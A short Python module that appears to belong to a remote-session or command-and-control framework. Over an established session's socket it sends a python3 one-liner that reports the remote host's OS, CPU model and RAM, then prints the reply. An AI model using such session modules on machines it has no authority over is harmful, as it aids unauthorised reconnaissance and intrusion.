
#basic module description
def description() -> str:
    return "Device info gatherer"

#basic module rank
def rank() -> str:
    return "Excellent"

#basic module date
def date() -> str:
    return "18.04.2026"

#set arguments
def depargs() -> dict:
    return {
        "session": "Session number"
    }

#imports
from StrFuncs import err, evnt, timenow, beautip
from SessionManager import manager
import socket

#main function
def main(payload, sid) -> None:
    try:
        session = manager.getsession(sid)
        conn, addr = session["conn"], session["addr"]
        print(f"{evnt()} Connection established from {beautip(addr[0])}:{addr[1]}")
        print(f"{timenow()} Sending payload to {addr[0]}")
        conn.send(payload.encode('utf-8'))
        answ = conn.recv(1024 * 1024).decode()
        print(answ)
    except Exception as er:
        print(f"{err()} {er}")


#launch func
def launch(args) -> None:
    sid = int(args.get("session"))
    payload = """python3 -c 'import platform, os, psutil; v = psutil.virtual_memory(); ram = f"{v.total / (1024**3):.1f}GB"; cpu = next((line.split(":")[1].strip() for line in open("/proc/cpuinfo") if "model name" in line), "Unknown") if os.path.exists("/proc/cpuinfo") else "Unknown"; print(f"os: {platform.system()} {platform.release()}\\ncpu: {cpu}\\nram: {ram}")'"""

    main(payload, sid)

